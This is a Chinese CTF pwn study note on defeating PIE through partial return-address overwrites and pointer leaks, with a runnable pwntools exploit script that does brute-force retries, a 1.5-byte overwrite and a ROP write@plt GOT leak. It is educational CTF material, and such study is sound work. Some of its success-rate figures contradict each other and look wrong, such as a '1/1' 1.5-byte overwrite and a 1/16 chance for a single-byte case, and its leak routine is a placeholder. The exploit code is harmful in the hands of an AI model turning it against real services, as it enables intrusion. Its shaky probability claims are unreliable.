---
title: PIE 绕过 —— 部分覆盖与信息泄露
category: pwn
tags: [PIE, 部分覆盖, 1.5字节, 信息泄露, ASLR]
signals: [checksec 显示 PIE enabled, 无输出函数无法泄露, 溢出只需改返回地址低2字节, 程序有 read 无 write/puts, 返回地址与目标函数同页, 栈上残留代码段地址]
difficulty: medium
source: "CTF-Wiki 花式栈溢出 / ir0nstone PIE Bypass"
tools: [pwntools, gdb, pwndbg, ROPgadget]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- `checksec`：`PIE enabled`，同时 `No canary`。
- 程序只 `read` 不 `puts`，完全无法输出——**没有泄露点**。
- 溢出长度刚好能覆盖到返回地址的**低 1~2 字节**（`read(0, buf, 0x30)` 而 `buf` 是 `0x28`）。
- 目标 `win` 函数与 `vuln` 函数在同一个 0x1000 页内（`objdump` 比较地址高位相同）。
- 题目在 `main` 里把一个函数指针 / libc 地址打到栈上却没有输出。

## 二、原理

PIE 让整个 ELF 以随机基址加载，但：

1. **页内偏移不变**：`win` 与 `vuln` 若在同 4KB 页内，二者只差低 12 位。
2. **x86-64 返回地址只需改低 2 字节**：基址随机化只影响高位（`0x5555555xxxx000`），低 12 位由文件内偏移决定；若目标与当前返回地址在同一个 64KB 内，只改低 2 个字节即可命中，成功概率 = `1/16`（低 4 位由对齐决定，实际 `1/16` ~ `1/256` 视 ASLR 位数）。
3. **1.5 字节覆盖**：改 2 字节中高 nibble 保持不变（只改 12 位），成功率 `1/1`。
4. **泄露**：任何能输出栈/堆内容的功能都能拿到代码或 libc 地址，反推 base。

ASLR 熵：Linux 用户态 PIE 基址随机化通常 28 位（页面粒度），低 12 位固定。

```text
真实返回地址:  0x5555_5555_51a9   ← 高随机 + 低固定
目标 win 地址: 0x5555_5555_51b8   ← 只差低 2 字节
=> 只覆盖 [0:2] 字节为 b8 51
```

## 三、checksec 判读与利用思路

```text
RELRO: Partial  Canary: No  NX: enabled  PIE: enabled
```

四条路，按优先级：

1. **能输出（`puts`/`write`/`printf` 任意）** → 制造泄露：ROP 调 `write(1, elf.got['read'], 8)`，或格式化字符串 `%p`。
2. **能改返回地址低 2 字节** → 部分覆盖到 `win`；循环重试（服务不重启时单次成功即可，重启则多连几次）。
3. **能改低 1 字节 + 1.5 字节** → 若 `win` 与 `vuln` 偏移 < 0x100，只改 1 字节，成功率 `1/16`。
4. **栈上已有代码地址** → 用 `%p` 或 `%s` 顺带读出，算 base。

关键计算：

```python
# 目标函数与当前返回地址的相对偏移
ret_off  = 0x11a9     # 从 vuln 返回后压入的地址（objdump 看 call 后一条指令）
win_off  = 0x11b8
delta    = win_off & 0xffff
payload  = b"A"*0x28 + p16(delta)      # 只覆盖低 2 字节
```

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./pwn")
context.log_level = "info"

def start():
    return remote(args.HOST or "TARGET", int(args.PORT or 1337)) if args.REMOTE \
           else process()

OFFSET   = 0x28                     # buf 大小（实测）
WIN      = elf.sym["win"]           # 相对偏移，PIE 下就是页内偏移
RET_ADDR = 0x11a9                   # 当前栈上的返回地址偏移（占位）
BASE     = None

# ---------- 方案 A：先泄露 PIE base，再精确打 ----------
def leak_pie_base(p):
    # 用格式化字符串/puts 泄露一个已知偏移的指针即可；这里演示 puts 泄漏
    payload  = b"A" * OFFSET
    payload += p64(elf.sym["main"])          # 占位：真实题目需先泄露 GOT / 栈地址
    p.sendline(payload)
    data = p.recv(timeout=1)
    for line in data.split(b"\n"):
        if line.startswith(b"\x7f") or line.startswith(b"\x55"):
            return u64(line.ljust(8, b"\x00"))
    return None

# ---------- 方案 B：部分覆盖（无泄露时） ----------
def partial_overwrite(retry=32):
    """win 与 ret 的同页/相邻 64K 内，只覆盖低 2 字节"""
    low2 = WIN & 0xffff
    for attempt in range(retry):
        p = start()
        payload  = b"A" * OFFSET
        payload += p16(low2)                  # 只改 2 字节，高 6 字节保留
        p.send(payload)
        try:
            p.sendline(b"cat /flag")
            data = p.recv(timeout=1)
            if b"flag{" in data or b"CTF{" in data:
                return p, data
        except EOFError:
            pass
        p.close()
        log.info(f"attempt {attempt+1}/{retry} failed")
    return None, None

# ---------- 方案 C：1.5 字节覆盖（只改低 12 位，去掉 nibble 随机） ----------
def overwrite_1_5byte():
    """
    把返回地址低 2 字节中的高 4 位保持不变，只改低 12 位。
    需要读回原返回地址（如通过 %p 或栈泄漏），否则退化成方案 B。
    """
    orig = RET_ADDR & 0xffff              # 原始低 2 字节（从泄露推导）
    target = WIN & 0xffff
    new_low2 = (orig & 0xf000) | (target & 0x0fff)
    if (new_low2 & 0xf000) != (orig & 0xf000):
        log.warn("目标与原地址不在同 64K，1.5 字节覆盖不可行")
        return None
    return b"A" * OFFSET + p16(new_low2)

# ---------- 方案 D：派生泄露——用 write 打 GOT ----------
def leak_with_write(p, pop_rdi, pop_rsi_pop_r15, pop_rdx, write_plt, got, main):
    """无输出函数但 PIE 开：部分覆盖到 write@plt 的那段 gadget 也不行时用这个"""
    payload  = b"A" * OFFSET
    payload += p64(pop_rdi) + p64(1)
    payload += p64(pop_rsi_pop_r15) + p64(got) + p64(0)
    payload += p64(pop_rdx) + p64(8)
    payload += p64(write_plt) + p64(main)
    p.sendline(payload)
    return u64(p.recvn(8))

if __name__ == "__main__":
    if args.PARTIAL:
        p, data = partial_overwrite()
        if data:
            success(data.decode(errors="ignore"))
            p.interactive()
    else:
        p = start()
        base = leak_pie_base(p)
        if base:
            elf.address = base - elf.sym["main"] + 0
            success(f"PIE base = {hex(elf.address)}")
        p.interactive()
```

核对偏移用 objdump：

```bash
objdump -d ./pwn | grep -E '<(vuln|win|main)>:' -A2
# 确认 win 与 vuln 的 call 后地址是否同页：addr>>12 相同即可打 1 字节
```

## 五、常见坑 / 变体

- **部分覆盖写到 high nibble 里**：`p16(WIN & 0xffff)` 会带上目标的高 4 位，若与 ASLR 随机出的 nibble 不匹配就必崩；要读回原值做 `(orig & 0xf000) | (target & 0xfff)`。
- **失败 90% 以为写错**：ASLR 每次刷新，本地 `process()` 每次都新随机。写重试循环（32~256 次）再看。
- **`p16` 后残留字节**：`read` 只读到 0x2a 字节时后续是旧栈内容，payload 尾部补 `\x00` 或直接用 `send` 而非 `sendline`。
- **`ELF.address` 设置了但 `elf.sym` 没变**：pwntools 里必须 `elf.address = base`，之后 `elf.sym[x]` 才是绝对地址。
- **堆地址泄露也算 base**：有些题泄露的是 `heap` 地址，与 PIE 无关，别搞混。
- **`SHSTK` 开启**：返回地址部分覆盖会触发 `#CP` 异常，只能走数据类劫持（函数指针 / `_IO_FILE`）。

## 六、参考来源

- [CTF-Wiki: 花式栈溢出技巧](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/)
- [ir0nstone: PIE](https://ir0nstone.gitbook.io/notes/binexp/stack/pie)
- [ir0nstone: PIE Bypass（部分覆盖）](https://ir0nstone.gitbook.io/notes/binexp/stack/pie/pie-bypass)
- [ir0nstone: ASLR](https://ir0nstone.gitbook.io/notes/binexp/stack/aslr)
- [HackTricks: ASLR Bypass](https://book.hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/index.html)
- [CTF-Wiki: 获取地址汇总](https://ctf-wiki.org/pwn/linux/user-mode/summary/get-address/)
